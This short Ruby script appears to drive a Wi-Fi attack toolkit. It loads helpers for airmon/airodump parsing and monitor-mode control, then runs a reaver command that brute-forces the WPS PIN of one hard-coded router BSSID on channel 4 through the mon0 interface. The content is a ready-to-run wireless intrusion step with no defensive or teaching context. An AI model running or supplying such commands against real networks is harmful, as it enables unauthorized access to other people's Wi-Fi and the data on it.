require './airmon_parser.rb'
require './monitoring_stopper.rb'
require './airodump_runner.rb'
require './airodump_parser.rb'
require './router_init.rb'


#out = File.new("out.html", "w")

#out.puts "<html>\n\t<head><title>RHT</title></head>\n\t<body>"
#out.puts "\n\t"

system("reaver -i mon0 -b B0:48:7A:F3:EA:D4 -c 4 -vv -x 60")

puts "Bye"
